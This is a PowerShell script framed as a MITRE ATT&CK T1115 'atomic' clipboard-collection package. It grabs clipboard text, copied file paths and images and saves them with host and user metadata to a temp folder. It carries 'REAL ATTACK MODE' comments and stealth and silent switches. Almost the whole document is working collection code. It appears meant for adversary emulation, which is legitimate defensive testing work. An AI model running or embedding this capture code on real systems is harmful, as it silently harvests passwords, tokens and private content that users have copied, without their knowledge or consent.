# T1115.001a - Clipboard Data: Content Capture
# MITRE ATT&CK Enterprise - Collection Tactic
# ATOMIC ACTION: Capture clipboard content ONLY (instant snapshot)
# Platform: Windows | Privilege: User | Type: Atomic Package

param()

function Get-Configuration {
    return @{
        # REAL ATTACK MODE - Hardcoded variables for real attack
        "OUTPUT_BASE" = "$env:TEMP\mitre_results"
        "TIMEOUT" = 30

        # T1115.001a - REAL ATTACK MODE - Complete clipboard capture
        T1115_001A_CAPTURE_TEXT = $true
        T1115_001A_CAPTURE_FILES = $true
        T1115_001A_CAPTURE_IMAGES = $true
        T1115_001A_CAPTURE_HTML = $true
        T1115_001A_CAPTURE_RTF = $true
        T1115_001A_MAX_TEXT_LENGTH = 100000
        T1115_001A_SAVE_IMAGES = $true
        T1115_001A_IMAGE_FORMAT = "png"
        T1115_001A_INCLUDE_METADATA = $true
        T1115_001A_CONTINUOUS_MONITORING = $true
        T1115_001A_MONITORING_DURATION_SEC = 3600
        T1115_001A_OUTPUT_MODE = "debug"
        T1115_001A_SILENT_MODE = $false
        T1115_001A_STEALTH_MODE = $false
    }
}

function Invoke-MicroTechniqueAction {
    param([hashtable]$Config)
    
    # ATOMIC ACTION: Clipboard content capture ONLY
    if (-not $Config.T1115_001A_SILENT_MODE) {
        Write-Host "[INFO] Starting atomic clipboard content capture..." -ForegroundColor Yellow
    }
    
    $clipboardResults = @{
        "action" =  "clipboard_content_capture"
        "technique_id" =  "T1115.001a"
        "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
        "hostname" = $env:COMPUTERNAME
        "username" = $env:USERNAME
        "privilege_level" =  "user"
    }
    
    try {
        # Prepare output directory
        $outputDir = Join-Path $Config.OUTPUT_BASE "t1115.001a-clipboard"
        if (-not (Test-Path $outputDir)) {
            New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
        }
        
        # Load required assemblies
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $capturedData = @{
            "text_content" = $null
            "file_list" = @()
            "image_captured" = $false
            "image_path" = $null
            "formats_available" = @()
            "capture_timestamp" = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss.fff")
        }
        
        # Get available clipboard formats
        $clipboard = [System.Windows.Forms.Clipboard]::GetDataObject()
        
        if ($clipboard) {
            $formats = $clipboard.GetFormats()
            $capturedData.formats_available = $formats
            
            if (-not $Config.T1115_001A_SILENT_MODE) {
                Write-Host "[INFO] Available clipboard formats: $($formats -join ', ')" -ForegroundColor Cyan
            }
            
            # Capture text content
            if ($Config.T1115_001A_CAPTURE_TEXT -and $clipboard.GetDataPresent([System.Windows.Forms.DataFormats]::Text)) {
                try {
                    $textContent = $clipboard.GetData([System.Windows.Forms.DataFormats]::Text)
                    
                    if ($textContent -and $textContent.Length -gt 0) {
                        # Truncate if too long
                        if ($textContent.Length -gt $Config.T1115_001A_MAX_TEXT_LENGTH) {
                            $capturedData.text_content = $textContent.Substring(0, $Config.T1115_001A_MAX_TEXT_LENGTH) + "...[TRUNCATED]"
                            $capturedData.text_truncated = $true
                            $capturedData.original_text_length = $textContent.Length
                        } else {
                            $capturedData.text_content = $textContent
                            $capturedData.text_truncated = $false
                            $capturedData.original_text_length = $textContent.Length
                        }
                        
                        $capturedData.text_captured = $true
                        
                        # Save text to file
                        $textFile = Join-Path $outputDir "clipboard_text.txt"
                        $capturedData.text_content | Out-File -FilePath $textFile -Encoding UTF8
                        $capturedData.text_file = $textFile
                    } else {
                        $capturedData.text_captured = $false
                        $capturedData.text_content = $null
                    }
                } catch {
                    $capturedData.text_error = $_.Exception.Message
                    $capturedData.text_captured = $false
                }
            }
            
            # Capture file list
            if ($Config.T1115_001A_CAPTURE_FILES -and $clipboard.GetDataPresent([System.Windows.Forms.DataFormats]::FileDrop)) {
                try {
                    $fileList = $clipboard.GetData([System.Windows.Forms.DataFormats]::FileDrop)
                    
                    if ($fileList -and $fileList.Count -gt 0) {
                        foreach ($file in $fileList) {
                            if (Test-Path $file) {
                                $fileInfo = Get-Item $file
                                $capturedData.file_list += @{
                                    "path" = $file
                                    "name" = $fileInfo.Name
                                    "size_bytes" = if ($fileInfo.PSIsContainer) { 0 } else { $fileInfo.Length }
                                    "is_directory" = $fileInfo.PSIsContainer
                                    "last_modified" = $fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                                }
                            } else {
                                $capturedData.file_list += @{
                                    "path" = $file
                                    "exists" = $false
                                }
                            }
                        }
                        
                        $capturedData.files_captured = $true
                        
                        # Save file list
                        $fileListFile = Join-Path $outputDir "clipboard_files.json"
                        $capturedData.file_list | ConvertTo-Json -Depth 5 | Out-File -FilePath $fileListFile -Encoding UTF8
                        $capturedData.file_list_file = $fileListFile
                    }
                } catch {
                    $capturedData.files_error = $_.Exception.Message
                    $capturedData.files_captured = $false
                }
            }
            
            # Capture image
            if ($Config.T1115_001A_CAPTURE_IMAGES -and $clipboard.GetDataPresent([System.Windows.Forms.DataFormats]::Bitmap)) {
                try {
                    $image = $clipboard.GetData([System.Windows.Forms.DataFormats]::Bitmap)
                    
                    if ($image -and $Config.T1115_001A_SAVE_IMAGES) {
                        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss_fff"
                        $imageFileName = "clipboard_image_$timestamp.$($Config.T1115_001A_IMAGE_FORMAT)"
                        $imagePath = Join-Path $outputDir $imageFileName
                        
                        switch ($Config.T1115_001A_IMAGE_FORMAT.ToLower()) {
                            "png" {
                                $image.Save($imagePath, [System.Drawing.Imaging.ImageFormat]::Png)
                            }
                            { $_ -in @("jpg", "jpeg") } {
                                $image.Save($imagePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                            }
                            "bmp" {
                                $image.Save($imagePath, [System.Drawing.Imaging.ImageFormat]::Bmp)
                            }
                            default {
                                $image.Save($imagePath, [System.Drawing.Imaging.ImageFormat]::Png)
                            }
                        }
                        
                        if (Test-Path $imagePath) {
                            $imageInfo = Get-Item $imagePath
                            $capturedData.image_captured = $true
                            $capturedData.image_path = $imagePath
                            $capturedData.image_filename = $imageFileName
                            $capturedData.image_size_bytes = $imageInfo.Length
                            $capturedData.image_size_mb = [math]::Round($imageInfo.Length / 1MB, 2)
                            $capturedData.image_dimensions = "$($image.Width)x$($image.Height)"
                        }
                    } elseif ($image) {
                        $capturedData.image_captured = $true
                        $capturedData.image_dimensions = "$($image.Width)x$($image.Height)"
                        $capturedData.image_saved = $false
                    }
                } catch {
                    $capturedData.image_error = $_.Exception.Message
                    $capturedData.image_captured = $false
                }
            }
        } else {
            $capturedData.clipboard_empty = $true
        }
        
        # Determine overall status
        $hasContent = $capturedData.text_captured -or $capturedData.files_captured -or $capturedData.image_captured
        
        $clipboardResults.results = @{
            "status" = if ($hasContent) { "success" } else { "empty" }
            "content_types_found" = @()
            "captured_data" = $capturedData
            "output_directory" = $outputDir
        }
        
        # Build content types list
        if ($capturedData.text_captured) { $clipboardResults.results.content_types_found += "text" }
        if ($capturedData.files_captured) { $clipboardResults.results.content_types_found += "files" }
        if ($capturedData.image_captured) { $clipboardResults.results.content_types_found += "image" }
        
        if (-not $Config.T1115_001A_SILENT_MODE) {
            if ($hasContent) {
                Write-Host "[SUCCESS] Clipboard content captured: $($clipboardResults.results.content_types_found -join ', ')" -ForegroundColor Green
            } else {
                Write-Host "[INFO] Clipboard is empty or contains no supported content" -ForegroundColor Yellow
            }
        }
    }
    catch {
        $clipboardResults.results = @{
            "status" =  "error"
            "error" = $_.Exception.Message
            "content_types_found" = @()
        }
        
        if (-not $Config.T1115_001A_SILENT_MODE) {
            Write-Error "Clipboard capture failed: $($_.Exception.Message)"
        }
    }
    
    return $clipboardResults
}

function Write-StandardizedOutput {
    param([hashtable]$Data, [hashtable]$Config)
    
    $outputDir = Join-Path $Config.OUTPUT_BASE "t1115.001a-clipboard"
    if (-not (Test-Path $outputDir)) {
        New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
    }
    
    switch ($Config.T1115_001A_OUTPUT_MODE) {
        "simple" {
            if ($Data.results.status -eq "success") {
                $simpleOutput = "Clipboard captured: $($Data.results.content_types_found -join ', ')"
            } elseif ($Data.results.status -eq "empty") {
                $simpleOutput = "Clipboard is empty"
            } else {
                $simpleOutput = "Clipboard capture failed: $($Data.results.error)"
            }
            
            if (-not $Config.T1115_001A_SILENT_MODE) {
                Write-Output $simpleOutput
            }
            
            $simpleOutput | Out-File -FilePath (Join-Path $outputDir "clipboard_simple.txt") -Encoding UTF8
        }
        
        "stealth" {
            $jsonFile = Join-Path $outputDir "clipboard_capture.json"
            $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
        }
        
        "debug" {
            $jsonFile = Join-Path $outputDir "clipboard_capture.json"
            $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
            
            if (-not $Config.T1115_001A_SILENT_MODE) {
                Write-Host "[DEBUG] Clipboard data written to: $jsonFile" -ForegroundColor Cyan
            }
        }
    }
    
    return $outputDir
}

function Main {
    try {
        $Config = Get-Configuration
        $results = Invoke-MicroTechniqueAction -Config $config
        $outputPath = Write-StandardizedOutput -Data $results -Config $config
        
        if (-not $Config.T1115_001A_SILENT_MODE) {
            Write-Host "[COMPLETE] T1115.001a atomic execution finished - Output: $outputPath" -ForegroundColor Green
        }
        
        return 0
    }
    catch {
        if (-not $Config.T1115_001A_SILENT_MODE) {
            Write-Error "T1115.001a execution failed: $($_.Exception.Message)"
        }
        return 1
    }
}

exit (Main)


